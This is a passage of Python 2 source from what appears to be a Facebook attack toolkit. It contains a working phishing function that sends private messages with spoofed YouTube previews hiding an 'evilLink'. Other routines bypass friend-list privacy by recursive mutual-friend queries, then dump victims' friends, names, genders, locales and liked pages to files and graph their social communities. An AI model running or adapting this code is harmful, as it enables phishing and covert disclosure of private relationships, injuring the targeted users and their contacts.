            'message_batch[0][content_attachment][composer_metrics][best_image_w]' : '100',
            'message_batch[0][content_attachment][composer_metrics][best_image_h]' : '100',
            'message_batch[0][content_attachment][composer_metrics][image_selected]' : '0',
            'message_batch[0][content_attachment][composer_metrics][images_provided]' : '1',
            'message_batch[0][content_attachment][composer_metrics][images_loaded]' : '1',
            'message_batch[0][content_attachment][composer_metrics][images_shown]' : '1',
            'message_batch[0][content_attachment][composer_metrics][load_duration]' : '6',
            'message_batch[0][content_attachment][composer_metrics][timed_out]' : '0',
            'message_batch[0][content_attachment][composer_metrics][sort_order]' : '',
            'message_batch[0][content_attachment][composer_metrics][selector_type]' : 'UIThumbPager_6',
            'message_batch[0][force_sms]' : 'true',
            'message_batch[0][ui_push_phase]' : 'V3',
            'message_batch[0][status]' : '0',
            'message_batch[0][message_id]' : '<1394766424499:3126670212-4125121119@mail.projektitan.com>',
            'message_batch[0][client_thread_id]' : 'user:'+str(c_user),
            'client' : 'web_messenger',
            '__user' : c_user,
            '__a' : '1',
            '__dyn' : '7n8a9EAMBlCFYwyt2u6aOGeExEW9J6yUgByVbGAF4iGGeqheCu6po',
            '__req' : '1n',
            'fb_dtsg' : br.form['fb_dtsg'],
            'ttstamp' : '26581658074898653',
            '__rev' : '1161243'
            }
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php',datos)
        
        if globalLogging:
                logs(response.read())
    
    except mechanize.HTTPError as e:
        print e.code
    except mechanize.URLError as e:
            print e.reason.args         
    except:
        print 'Ctrl+c SIGNAL Caught\n'
        return

def privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,summary,videoID,hijackedVideo):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        set_dtsg()
        arguments = {
            'message_batch[0][action_type]' : 'ma-type:user-generated-message',
            'message_batch[0][thread_id]' : '',
            'message_batch[0][author]' : 'fbid:766864933',
            'message_batch[0][author_email]' : '',
            'message_batch[0][coordinates]' : '',
            'message_batch[0][timestamp]' : '1372684598010',
            'message_batch[0][timestamp_absolute]' : 'Today',
            'message_batch[0][timestamp_relative]' : '10:16am',
            'message_batch[0][timestamp_time_passed]' : '0',
            'message_batch[0][is_unread]' : 'false',
            'message_batch[0][is_cleared]' : 'false',
            'message_batch[0][is_forward]' : 'false',
            'message_batch[0][is_filtered_content]' : 'false',
            'message_batch[0][spoof_warning]' : 'false',
            'message_batch[0][source]' : 'source:titan:web',
            'message_batch[0][body]' : str(message),
            'message_batch[0][has_attachment]' : 'true',
            'message_batch[0][html_body]' : 'false',
            'message_batch[0][specific_to_list][0]' : 'fbid:'+str(victimId),
            'message_batch[0][specific_to_list][1]' : 'fbid:'+str(c_user),
            'message_batch[0][content_attachment][subject]' : str(subject),
            'message_batch[0][content_attachment][app_id]' : '2309869772',
            'message_batch[0][content_attachment][attachment][params][urlInfo][canonical]' : str(videoLink),
            'message_batch[0][content_attachment][attachment][params][urlInfo][final]' : str(videoLink),
            'message_batch[0][content_attachment][attachment][params][urlInfo][user]' : str(evilLink),
            'message_batch[0][content_attachment][attachment][params][favicon]' : 'http://s.ytimg.com/yts/img/favicon_32-vflWoMFGx.png',
            'message_batch[0][content_attachment][attachment][params][title]' : str(title),
            'message_batch[0][content_attachment][attachment][params][summary]' : str(summary),
            'message_batch[0][content_attachment][attachment][params][images][0]' : 'http://i1.ytimg.com/vi/'+videoID+'/mqdefault.jpg?feature=og&cfs=1&upscale',
            'message_batch[0][content_attachment][attachment][params][medium]' : '103',
            'message_batch[0][content_attachment][attachment][params][url]' : str(videoLink),
            'message_batch[0][content_attachment][attachment][params][video][0][type]' : 'application/x-shockwave-flash',
            'message_batch[0][content_attachment][attachment][params][video][0][src]' : 'http://www.youtube.com/v/'+str(hijackedVideo)+'?version=3&autohide=1&autoplay=1',
            'message_batch[0][content_attachment][attachment][params][video][0][width]' : '1280',
            'message_batch[0][content_attachment][attachment][params][video][0][height]' : '720',
            'message_batch[0][content_attachment][attachment][params][video][0][safe]' : '1',
            'message_batch[0][content_attachment][attachment][type]' : '100',
            'message_batch[0][content_attachment][link_metrics][source]' : 'ShareStageExternal',
            'message_batch[0][content_attachment][link_metrics][domain]' : 'www.youtube.com',
            'message_batch[0][content_attachment][link_metrics][base_domain]' : 'youtube.com',
            'message_batch[0][content_attachment][link_metrics][title_len]' : '59',
            'message_batch[0][content_attachment][link_metrics][summary_len]' : '160',
            'message_batch[0][content_attachment][link_metrics][min_dimensions][0]' : '70',
            'message_batch[0][content_attachment][link_metrics][min_dimensions][1]' : '70',
            'message_batch[0][content_attachment][link_metrics][images_with_dimensions]' : '1',
            'message_batch[0][content_attachment][link_metrics][images_pending]' : '0',
            'message_batch[0][content_attachment][link_metrics][images_fetched]' : '0',
            'message_batch[0][content_attachment][link_metrics][image_dimensions][0]' : '1280',
            'message_batch[0][content_attachment][link_metrics][image_dimensions][1]' : '720',
            'message_batch[0][content_attachment][link_metrics][images_selected]' : '1',
            'message_batch[0][content_attachment][link_metrics][images_considered]' : '1',
            'message_batch[0][content_attachment][link_metrics][images_cap]' : '10',
            'message_batch[0][content_attachment][link_metrics][images_type]' : 'images_array',
            'message_batch[0][content_attachment][composer_metrics][best_image_w]' : '100',
            'message_batch[0][content_attachment][composer_metrics][best_image_h]' : '100',
            'message_batch[0][content_attachment][composer_metrics][image_selected]' : '0',
            'message_batch[0][content_attachment][composer_metrics][images_provided]' : '1',
            'message_batch[0][content_attachment][composer_metrics][images_loaded]' : '1',
            'message_batch[0][content_attachment][composer_metrics][images_shown]' : '1',
            'message_batch[0][content_attachment][composer_metrics][load_duration]' : '2',
            'message_batch[0][content_attachment][composer_metrics][timed_out]' : '0',
            'message_batch[0][content_attachment][composer_metrics][sort_order]' : '',
            'message_batch[0][content_attachment][composer_metrics][selector_type]' : 'UIThumbPager_6',
            'message_batch[0][forward_count]' : '0',
            'message_batch[0][force_sms]' : 'true',
            'message_batch[0][ui_push_phase]' : 'V3',
            'message_batch[0][status]' : '0',
            'message_batch[0][message_id]' : '<1372684598010:2832510292-4024988604@mail.projektitan.com>',
            'message_batch[0][client_thread_id]' : 'user:'+str(victimId),
            'client' : 'web_messenger',
            '__user' : str(c_user),
            '__a' : '1',
            '__dyn' : '7n8ahyj35CCOadgDxqjdLg',
            '__req' : 'c',
            'fb_dtsg' : br.form['fb_dtsg'],
            'phstamp' : '16581677611695491025269'
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php ',datos)
        
        if globalLogging:
                logs(response.read())
    
    except mechanize.HTTPError as e:
        print e.code
    except mechanize.URLError as e:
            print e.reason.args         
    except:
        print 'Ctrl+c SIGNAL Caught\n'
        return


        
def linkFriends(victim):
    friends = []
    root = 'dumps'
    directory = victim
    delay = 1
    linkedFile = open(root+'\\'+directory+'\\'+victim+'friend_links.html',"wb")
    
    try:
        persons = open(root+'\\'+directory+'\\'+victim+'.txt',"rb")
    except:
        print '\r                                                        \r',
        print '\r %s.txt not exists, error on linkFriends module \r' %victim,
        logs(str(victim)+' not exists, error on linkFriends module')
        return

    while True:
        linea = persons.readline()
        if not linea:
            break
        friends.append(linea.strip("\n\r"))
        
    persons.close()
    
    for individuals in friends:
        try:
            response = br.open('https://graph.facebook.com/'+individuals)
            resultado = response.read()
            json_dump = json.loads(resultado)
            try:
                friend = json_dump['link']+'    '+json_dump['name']+'  '+json_dump['gender']+ '  '+ json_dump['locale']
                print friend
                linkedFile.write(MyParser.htmlFormat(json_dump))
            except:
                try:
                    print 'https://www.facebook.com/%s' %json_dump['username']+'    '+json_dump['name']+'  '+json_dump['gender']+ '  '+ json_dump['locale']
                except:
                    print 'https://www.facebook.com/%s' %individuals
        
        except mechanize.HTTPError as e:
                print e.code
                print 'Sleeping %d' %delay
                sleep(delay)
                delay += 1
        except mechanize.URLError as e:
                print e.reason.args
                print 'Sleeping %d URLerror ' %delay
                sleep(delay)
                delay += 1
    
    linkedFile.close()
    
def getName(userId):
    delay = 0
    while delay < 60:
        try:
            response = br.open('https://graph.facebook.com/'+str(userId))
            resultado = response.read()
            json_dump = json.loads(resultado)
            try:
                return str(json_dump['username'])
            except:
                return str(userId)
        
        except mechanize.HTTPError as e:
                print str(e.code) + 'Increasing delay %d' %delay
                delay += 30 
                sleep(delay)
        except mechanize.URLError as e:
                print str(e.reason.args)  + 'Increasing delay %d' %delay
                delay += 30
                sleep(delay)
                
    #In case the while ends
    return str(userId)


def mkdir(directory,root):
    import os
    
    if os.path.exists(root+'\\'+directory):
        return 
    else:
        os.makedirs(root+'\\'+directory)
         

def saveObjects(victim,matrix,ref):
    path = 'dumps\\'+victim+'\\objects\\'+victim
    f = open(path,"wb")
    pickle.dump(matrix,f)
    g = open(path+'.ref',"wb")
    pickle.dump(ref,g)
    g.close()
    f.close()
    
def loadObjects(victim):
    try:
        path = 'dumps\\'+victim+'\\objects\\'+victim
        f = open(path,"rb")
        A = pickle.load(f)
        g = open( path +'.ref',"rb")
        ref = pickle.load(g)
        g.close()
        f.close()
        return A,ref
    except:
        return [],{}

def reAnalyzeGraph(victim):
    try:
        f = open('dumps\\'+victim+'\\objects\\'+victim+'-community',"rb")
        labelGraph = pickle.load(f)
        f.close()
    except:
        logs('Error on reAnalyzeGraph() object not exist')
        print 'Error on reAnalyzeGraph() object not exist\n'
        return
    
    #Community algorithm
    root = 'dumps'
    directory = victim
    
    try:
        partition = community.best_partition(labelGraph)
        
        for i in set(partition.values()):
            print "Community", i
            members = [nodes for nodes in partition.keys() if partition[nodes] == i]
                        
            egonet = labelGraph.subgraph(set(members))
            print sorted(egonet.nodes(),reverse=False)
            print sorted(egonet.edges(),reverse=False)
            
                
            nx.draw_spring(egonet,node_color = np.linspace(0,1,len(egonet.nodes())),edge_color = '#000000' ,with_labels=True)
            plt.savefig(root+"\\"+directory+"\\"+victim+"Community"+str(i)+".pdf")
            plt.savefig(root+"\\"+directory+"\\"+victim+"Community"+str(i)+".png")
            write_dot(egonet,root+"\\"+directory+"\\"+victim+"Community"+str(i)+".dot")			
            plt.show()
           
            
        raw_input('Press enter to continue...\n')
    except:
        logs('Error on reAnalyzeGraph() debbug for more information')
        print 'Error on reAnalyzeGraph() debbug for more information\n'
        return

def analyzeGraph(victim):
    root = 'dumps'
    directory = victim
    mkdir(directory,root)
    
    
    edges = {}
    edgesValues = {}
    nodekeys = {}
    userNames = []
    commonPages = {}
    
    A,idkeys = loadObjects(victim)
    if A != []:       
        
        myGraph = nx.from_numpy_matrix(A)
        
        nodes = myGraph.nodes()
        
        #Percentage
        i = 0.0
        percentage = 0.0
        
        #flush
        print '\r                                                        \r',        
        
        #Dictio creation of usernames
        #Associated with node number
        print 'Attemping to get user\'s information'
        for elements in idkeys.keys():
            user = getName(elements)
            commonPages[user] = corePagesLike(victim,elements)
            userNames.append(user)
            nodekeys[idkeys[elements]] = user
            percentage = (i * 100.0)/len(idkeys.keys())
            print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(idkeys.keys()), percentage), 
            i+=1
        
        reference = open(root+"\\"+directory+"\\"+victim+"references.txt","wb")
            
        for users in nodekeys.keys():
            line = str(nodekeys[users])+' : '+str(users) 
            reference.write(line + '\n')
            
        reference.close()
        
        for node in nodes:
            edges[node] = myGraph.degree(node)
            if edgesValues.has_key(edges[node]):
                edgesValues[edges[node]].append(node)
            else:
                edgesValues[edges[node]] = [node]
    
        
        for values in sorted(edgesValues.keys(),reverse=True):
            print str(values) + ' aristas; nodos: ',
            for nodes in edgesValues[values]:
                print str(nodes) + ', ',
            print '\n'
        
        print nx.is_connected(myGraph)
        
        print nx.number_connected_components(myGraph)
        
        ccs = nx.clustering(myGraph)
        print ccs
        print sum(ccs)/len(ccs) 
        
        #Creation of the labeld graph for community
        labelNodes = myGraph.nodes()
        labelEdges = myGraph.edges()
        labelGraph = nx.Graph()
        
        for label in labelNodes:
            labelGraph.add_node(nodekeys[int(label)],likes=commonPages[nodekeys[int(label)]])
        
        for labelE in labelEdges:
            labelGraph.add_edge(nodekeys[int(labelE[0])],nodekeys[int(labelE[1])])
        
        nx.draw_spring(labelGraph,node_color = np.linspace(0,1,len(labelGraph.nodes())),edge_color = np.linspace(0,1,len(labelGraph.edges())) ,with_labels=True)
        plt.savefig(root+'\\'+directory+'\\'+victim+"labelGraph_color.pdf")
        plt.savefig(root+'\\'+directory+'\\'+victim+"labelGraph_color.png")
        write_dot(labelGraph,root+'\\'+directory+'\\'+victim+"labelGraph_color.dot")    
        plt.show()
        
        #Saving the object for future analysis
        f = open('dumps\\'+victim+'\\objects\\'+victim+'-community',"wb")
        pickle.dump(labelGraph,f)
        f.close()
        
        #Community algorithm
        partition = community.best_partition(labelGraph)
        
        for i in set(partition.values()):
            print "Community", i
            members = [nodes for nodes in partition.keys() if partition[nodes] == i]
            
            ''' No longer necessary (?) 
            reference = open(root+"\\"+directory+"\\community"+str(i)+"references.txt","wb")
            
            for nodes in members:
                line = str(nodekeys[int(nodes)])+' : '+str(nodes) 
                reference.write(line + '\n')
            
            reference.close()           
            ''' 
            
            egonet = labelGraph.subgraph(set(members))
            print sorted(egonet.nodes(),reverse=False)
            print sorted(egonet.edges(),reverse=False)
            
                
            nx.draw_spring(egonet,node_color = np.linspace(0,1,len(egonet.nodes())),edge_color = '#000000' ,with_labels=True)
            plt.savefig(root+"\\"+directory+"\\"+victim+"Community"+str(i)+".pdf")
            plt.savefig(root+"\\"+directory+"\\"+victim+"Community"+str(i)+".png")
            write_dot(egonet,root+"\\"+directory+"\\"+victim+"Community"+str(i)+".dot")				
            plt.show()
           
            
        raw_input('Press enter to continue...\n')
    else:
        logs('Error on analyzeGraph() file not exist')
        print 'Error on analyzeGraph() file not exist\n'
        return
    
    
        
def bypassFriendshipPrivacyPlot(victim, transitive):
   
    coleccion = {}
    nodeID = 0
    
    root = 'dumps'
    directory = str(victim)
    
    mkdir(directory,root)
    
    myGraph = nx.Graph()
    
    coleccion[victim] = nodeID
    
    victima = nodeID
    myGraph.add_node(victima)
    nodeID += 1
    
    
    #Percentage container
    percentage = 0.0
    #Disclosude friends container
    friendships = []
    #Already visited nodes container
    visited = []  
    try:
        #If the file already exists 
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"rb")
        #Reads every line of the file
        while True:
            linea = friendshipFile.readline()
            if not linea:
                break
            #Store in the visited array for non repetition
            visited.append(linea.strip("\n\r"))
        friendshipFile.close()
        A,coleccion = loadObjects(victim)
        if A == []:
            logs("Inconsistency, the userid file exists, but has no object associated")
            print "Inconsistency, the userid file exists, but has no object associated"
            return
        else:
            myGraph = nx.from_numpy_matrix(A)
    
    except:
        #If the file does not exists, creates the file
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
        friendshipFile.close()
     
    
    try:
        #Generates the first level of the search
        result = coreFriendshipPrivacy(victim,transitive)
    except:
        print 'Check the internet connection please..'
        return
    
    #Stores non repetitive values in the disclosed friends container
    for individuos in result:
        if individuos not in visited:
            if coleccion.has_key(individuos) == False:
                nodo = nodeID
                nodeID += 1
                coleccion[individuos] = nodo
            else:
                nodo = coleccion[individuos]
            
            if coleccion.has_key(transitive) == False:
                transitivo = nodeID
                nodeID += 1
                coleccion[transitive] = transitivo
            else:
                transitivo = coleccion[transitive]
            
            myGraph.add_node(nodo)
            myGraph.add_edge(nodo,transitivo)
            friendships.append(individuos)
    
    #Counter for percentage calculus purpose 
    i = 0.0
    #flush
    print '\r                                                        \r',
    #For every value in the first disclosed list, repeats until every value has been tryed    
    for friends in friendships:
        #Percentage calculus 
        percentage = (i * 100.0)/len(friendships)
        
        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
        i+=1
        #Only if the node wasn't visited 
        if friends not in visited:
            #if coreFriendshipPrivacy() fails, an exception is caught. Therefore, state wis still being True. 
            #Only if the try passes, the infinite while will end. (For internet error connection problem)
            state = True
            while state == True:
                try:
                    result = coreFriendshipPrivacy(victim,friends)
                    state = False
                except signalCaught as e:
                    state = False
                    print 'Signal Caught handler'
                    print '%s ' %e.args[0]
                    return
                except:
                    logs('Check the internet connection please.. Press enter when it\'s done')
                    print '\r                                                                       \r',
                    raw_input('\rCheck the internet connection please.. Press enter when it\'s done\r'),
            
            #Stores non repetitive values in the disclosed friends container    
            for element in result:
                if element not in friendships:
                    if coleccion.has_key(friends) == False:
                        nodo = nodeID
                        nodeID += 1
                        coleccion[friends] = nodo
                    else:
                        nodo = coleccion[friends]
                    
                    if coleccion.has_key(element) == False:
                        transitivo = nodeID
                        nodeID += 1
                        coleccion[element] = transitivo
                    else:
                        transitivo = coleccion[element]

                    myGraph.add_node(nodo)
                    myGraph.add_edge(nodo,transitivo)
                    friendships.append(element)
            
            #Stores every single value of friendships list alredy analyzed for non repetitivness
            visited.append(friends)
            
    #Check if the file exists, if true append, else create and writes
    try:
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"ab")
    except:
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
        
    #Stores every userID for further analyzis
    for friends in friendships:
        if coleccion.has_key(friends) == False:
            transitivo = nodeID
            nodeID += 1
            coleccion[friends] = transitivo
        else:
            transitivo = coleccion[friends]

        myGraph.add_edge(victima,transitivo)
        friendshipFile.write(str(friends)+'\n')
    
    
    friendshipFile.close()
    
    mkdir('objects',root+'\\'+directory)
    
    A = nx.adj_matrix(myGraph)
    saveObjects(victim, A, coleccion)
    
    nx.draw_spring(myGraph,node_color = np.linspace(0,1,len(myGraph.nodes())),edge_color = np.linspace(0,1,len(myGraph.edges())) ,with_labels=True)
    plt.savefig(root+'\\'+directory+'\\'+victim+"graph_color.pdf")
    plt.savefig(root+'\\'+directory+'\\'+victim+"graph_color.png")
    write_dot(myGraph,root+'\\'+directory+'\\'+victim+"graph_color.dot")	
    plt.show()

   
    
def bypassFriendshipPrivacy(victim, transitive):
    #Percentage container
    percentage = 0.0
    #Disclosude friends container
    friendships = []
    #Already visited nodes container
    visited = []  
    try:
        #If the file already exists 
        friendshipFile = open('dumps\\'+victim+'.txt',"rb")
        #Reads every line of the file
        while True:
            linea = friendshipFile.readline()
            if not linea:
                break
            #Store in the visited array for non repetition
            visited.append(linea.strip("\n\r"))
    
        friendshipFile.close()
    
    except:
        #If the file does not exists, creates the file
        friendshipFile = open('dumps\\'+victim+'.txt',"wb")
        friendshipFile.close()
     
    
    try:
        #Generates the first level of the search
        result = coreFriendshipPrivacy(victim,transitive)
    except:
        print '\r                                                                        \r',
        raw_input('\rCheck the internet connection please.. Press enter when it\'s done\r'),
        return
    
    #Stores non repetitive values in the disclosed friends container
    for individuos in result:
        if individuos not in visited:
            friendships.append(individuos)
    
    #Counter for percentage calculus purpose 
    i = 0.0
    #flush
    print '\r                                                        \r',
    #For every value in the first disclosed list, repeats until every value has been tryed    
    for friends in friendships:
        #Percentage calculus 
        percentage = (i * 100.0)/len(friendships)
        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
        i+=1
        #Only if the node wasn't visited 
        if friends not in visited:
            #if coreFriendshipPrivacy() fails, an exception is caught. Therefore, state wis still being True. 
            #Only if the try passes, the infinite while will end. (For internet error connection problem)
            state = True
            while state == True:
                try:
                    result = coreFriendshipPrivacy(victim,friends)
                    state = False
                except signalCaught as e:
                    state = False
                    print 'Signal Caught handler'
                    print '%s ' %e.args[0]
                    return
                except:
                    print '\r                                                        \r',
                    raw_input('\rCheck the internet connection please..\r'),
            
            #Stores non repetitive values in the disclosed friends container    
            for element in result:
                if element not in friendships:
                    friendships.append(element)
            
            #Stores every single value of friendships list alredy analyzed for non repetitivness
            visited.append(friends)
            
    #Check if the file exists, if true append, else create and writes
    try:
        friendshipFile = open('dumps\\'+victim+'.txt',"ab")
    except:
        friendshipFile = open('dumps\\'+victim+'.txt',"wb")
        
    #Stores every userID for further analyzis
    for friends in friendships:
        friendshipFile.write(str(friends)+'\n')
    
    friendshipFile.close()

def corePagesLike(victim,transitive):
    matchs = []
    begin = 0
    page = []
    
    try:
        response = br.open('https://www.facebook.com/'+str(victim)+'?and='+str(transitive)+'&sk=favorites')
        resultado = response.read()
        match = re.search('timelineFriendsColumnHeader',resultado)
        if match is not None:
            linea = re.search('timelineFriendsColumnHeader(.+)',resultado).group()

    except mechanize.HTTPError as e:
            print e.code
            #Should handle a custom error
            raise
    except mechanize.URLError as e:
            print e.reason.args
            #Should handle a custom error
            raise
    #Error connection the upper function will catch the exception
    except:
        raise
    
    while True:
        match = re.search('fbStreamTimelineFavInfoContainer',resultado[begin:])
        if match != None:
            matchEnd = re.search('\n',resultado[begin+match.start():])
            if matchEnd != None:
                matchs.append(resultado[begin+match.start():matchEnd.end()+begin+match.start()])
                begin = matchEnd.end()+begin+match.start()
                match = None
                matchEnd = None
        else:
            break
    
    
    for linea in matchs:
        start = 0
        try:
            #Search the string to get the position of the starting match
            matchAnd = re.search('page\.php\?id=',linea[start:])
            #Search the end of the match for taking the id length
            matchEnd = re.search('">',linea[start+matchAnd.end():])
            #If we have a start and an end, we have the id value
        except:
            print 'ERROR'
            
        
        if (matchAnd and matchEnd) is not None:
            #Appends the value given the proper position (resolved a few lines up)
            page.append(linea[start+matchAnd.end():start+matchEnd.start()+matchAnd.end() ])
            #Moves the pointer for next match
            start += matchEnd.start()+matchAnd.end() 
    return page

def checkPrivacy(victim):
    try:
            response = br.open('https://www.facebook.com/'+str(victim)+'?sk=friends')
            resultado = response.read()
            match = re.search('All Friends',resultado)
            matchBis = re.search('Todos los amigos',resultado)
            matchBisBis = re.search('Todos mis amigos',resultado)
            if ((match is not None) or (matchBis is not None) or (matchBisBis is not None)):
                matchFriends = re.search('id="friendsTypeaheadResults(.+)"',resultado).group()
                return matchFriends 
            else:
                return -1
    except:
        print 'Error in the process, brute force will be applied ..'
        return -1
    
def simpleGraph(friends, victim):
    coleccion = {}
    nodeID = 0

    root = 'dumps'
    directory = str(victim)
    
    mkdir(directory,root)
    
    myGraph = nx.Graph()
    
    coleccion[victim] = nodeID
    
    victima = nodeID
    myGraph.add_node(victima)
    nodeID += 1
    #Check if the file exists, if true append, else create and writes
    try:
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"ab")
    except:
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
        
    for friend in friends:
        
        friendshipFile.write(str(friend)+'\n')
        
        try:
            mutual = coreFriendshipPrivacy(victim, friend)
        except:
            continue
        
        coleccion[friend] = nodeID
        nodeID += 1
        
        if myGraph.has_node(friend) != True:
            myGraph.add_node(friend)
        
            
        if myGraph.has_edge(victima, friend) != True:
            myGraph.add_edge(victima, friend)

        for element in mutual:
            if myGraph.has_node(element) != True:
                myGraph.add_node(element)
                myGraph.add_edge(element, friend)
        
    friendshipFile.close()
    
    mkdir('objects',root+'\\'+directory)
    
    A = nx.adj_matrix(myGraph)
    saveObjects(victim, A, coleccion)
    
    nx.draw_spring(myGraph,node_color = np.linspace(0,1,len(myGraph.nodes())),edge_color = np.linspace(0,1,len(myGraph.edges())) ,with_labels=True)
    plt.savefig(root+'\\'+directory+'\\'+victim+"graph_color.pdf")
    plt.savefig(root+'\\'+directory+'\\'+victim+"graph_color.png")
    write_dot(myGraph,root+'\\'+directory+'\\'+victim+"graph_color.dot")    
    plt.show()
    
def friendshipPlot(text,victim):
    friends = []
    friendsID = []
    counter = 0
    lastId = 0
    while counter < 4:
        matchStart = re.search("_5q6s _8o _8t lfloat _ohe\" href=\"https://www.facebook.com/",text)
        if matchStart is not None:
            start = matchStart.end()
            matchEnd = re.search("\?",text[start:])
            name = text[start:matchEnd.start()+start]
            if (name not in friends) and (name != "profile.php"):
                friends.append(name)
                fbid = getUserID(name)
                if fbid is not -1:
                    friendsID.append(fbid)
            text = text[matchEnd.start()+start:]
        else:
            try:
                c_user = getC_user()
                userId = getUserID(victim)
                if getUserID(friends[len(friends)-1]) == lastId:
                    counter += 1
                lastId = getUserID(friends[len(friends)-1])
                encoded = b64encode('0:not_structured:'+str(lastId))
                response = br.open('https://www.facebook.com/ajax/pagelet/generic.php/AllFriendsAppCollectionPagelet?data={"collection_token":"'+userId+':2356318349:2","cursor":"'+encoded+'","tab_key":"friends","profile_id":'+userId+',"q":"'+victim+'","overview":false,"ftid":null,"order":null,"sk":"friends","importer_state":null}&__user='+c_user+'&__a=1&__dyn=7n8apij2qmp5zpQ9UoHbgWyxi9ACwKyaF299qzCAjFDxCm&__req=7&__rev=1183274')
                to_parse = str(response.read()).strip('for (;;);')
                try:
                    #Converts the json web response to a python like object
                    json_dump = json.loads(to_parse)
                    text = json_dump["payload"]
                except:
                    print 'Error on json loading' 
                
            except:
                print 'ERROR MOTHER FUCKER'
    return friendsID, friends

def coreFriendshipPrivacy(victim,transitive):
    friends = []
    try:
        response = br.open('https://www.facebook.com/'+str(victim)+'?and='+str(transitive)+'&sk=friends')
        resultado = response.read()
        match = re.search('timelineFriendsColumnHeader',resultado)
        if match is not None:
            linea = re.search('timelineFriendsColumnHeader(.+)',resultado).group()


    except mechanize.HTTPError as e:
            print e.code
            #Should handle a custom error
            raise
    except mechanize.URLError as e:
            print e.reason.args
            #Should handle a custom error
            raise
    #Error connection the upper function will catch the exception
    except:
        raise

    #Offset for the string search 
    start = 0
    #While line matches the searched values
    while True:
        try:
            #Search the string to get the position of the starting match
            matchAnd = re.search('user\.php\?id=',linea[start:])
            #Search the end of the match for taking the id length
            matchEnd = re.search('&amp',linea[start+matchAnd.end():])
            #If we have a start and an end, we have the id value   
            if (matchAnd and matchEnd) is not None:
                #Appends the value given the proper position (resolved a few lines up)
                toUserID = linea[start+matchAnd.end():start+matchEnd.start()+matchAnd.end()]
                if toUserID not in friends:
                    friends.append(toUserID)
                #Moves the pointer for next match
                start += matchEnd.start()+matchAnd.end()
        #If the match ends (Equals of end of the line for the search)
        except:
            #Search for more friends (Ajax controled)
            match = re.search('/ajax/browser/list/mutualfriends/',resultado)
            if match is not None:
                #Call for the extendend friend search module
                extend = seeMore(len(friends),victim,transitive)
                #Return the merge of the lists
                return list(set(extend + friends))
            else:
                #In case there are no more friends, returns the original list
                return friends

def seeMore(start,victim,transitive):
    #vitimId and transitiveId needs to be IDS, instead of usernames. Is like a cast from the username to the Id
    #doesn't matter if the given argument is already the id.
    victimId = getUserID(victim)
    transitiveId = getUserID(transitive)
    #Disclosed friends container
    extendedFriends = []
    
    if (victimId == -1) or (transitiveId == -1):
        return extendedFriends
    
    
    #While there friends to disclosed in the particular union set
    while True:
        
        try:
            response = br.open('https://www.facebook.com/ajax/browser/list/mutualfriends/?uid='+str(transitiveId)+'&view=grid&location=other&infinitescroll=0&short=1&node='+str(victimId)+'&start='+str(start)+'&__user='+str(getC_user())+'&__a=1&__dyn=7n8ahyj35zolgDxqihXzA&__req=6')
        except mechanize.HTTPError as e:
            print e.code
        except mechanize.URLError as e:
            print e.reason.args
        except:
            raise
        
        #Strips the web response for further processes
        to_parse = str(response.read()).strip('for (;;);')
        
        try:
            #Converts the json web response to a python like object
            json_dump = json.loads(to_parse)
        except:
            print 'Error on json loading'
            #For non-blocking excecution - The upper function is excpecting a list to be returned
            return extendedFriends
        
        #Offset represents the start offset for non-repetition purpose
        offset = 0
        
        #Controls the end of the module excecution
        NoneFlag = True
        
        #Search for friends to be added
        for element in range(len(json_dump['jsmods']['require'])):
            if json_dump['jsmods']['require'][element][0] == unicode('AddFriendButton'):
                NoneFlag = False
                offset += 1
                extendedFriends.append(json_dump['jsmods']['require'][element][3][1])
        
        #If no friend was added, the excecution ends
        if NoneFlag:
            break
        
        #Increments offset from the start in the search
        start += offset 
        
    #End of the while, returns the new list   
    return extendedFriends


def getUserID(user):
#Grabs the user Id using the OpenGraph
    try:
        response = br.open('https://graph.facebook.com/'+str(user))
        resultado = response.read()
        json_dump = json.loads(resultado)
        try:
            return json_dump['id']
        except:
            return -1
    
    except mechanize.HTTPError as e:
            print e.code
            return -1
    except mechanize.URLError as e:
            print e.reason.args
            return -1
    
def logs(messagelog):
    logging.basicConfig(filename='logs\\error.log',level=logging.DEBUG)
    cTime = ctime(time())
    log = str(cTime) + ' : ' + str(messagelog) + '\n'
    logging.debug(log) 
    
    
def dotFile(victim, transitive):

    root = 'dumps'
    directory = str(victim)
    
    mkdir(directory,root)
    
    myGraph = open(root+'\\'+directory+'\\'+victim+'_dot.dot',"wb")
    myGraph.write('Graph {\n')
    
    #Percentage container
    percentage = 0.0
    #Disclosude friends container
    friendships = []
    #Already visited nodes container
    visited = []  
    try:
        #If the file already exists 
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"rb")
        #Reads every line of the file
        while True:
            linea = friendshipFile.readline()
            if not linea:
                break
            #Store in the visited array for non repetition
            visited.append(linea.strip("\n\r"))
        friendshipFile.close()

    except:
        #If the file does not exists, creates the file
        friendshipFile = open(root+'\\'+directory+'\\'+victim+'.txt',"wb")
        friendshipFile.close()
     
    
    try:
        #Generates the first level of the search
        result = coreFriendshipPrivacy(victim,transitive)
    except:
        print 'Check the internet connection please..'
        return
    
    #Stores non repetitive values in the disclosed friends container
    transitivo = getName(transitive)
    for individuos in result:
        if individuos not in visited:
            chabon = getName(individuos)
            myGraph.write('    "'+transitivo + '" -> "' + chabon + '";\n')          
            friendships.append(individuos)
    visited.append(getUserID(transitive))
    #Counter for percentage calculus purpose 
    i = 0.0
    #flush
    print '\r                                                        \r',
    #For every value in the first disclosed list, repeats until every value has been tried    
    for friends in friendships:
        #Percentage calculus 
        percentage = (i * 100.0)/len(friendships)
        
        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
        i+=1
        #Only if the node wasn't visited 
        if friends not in visited:
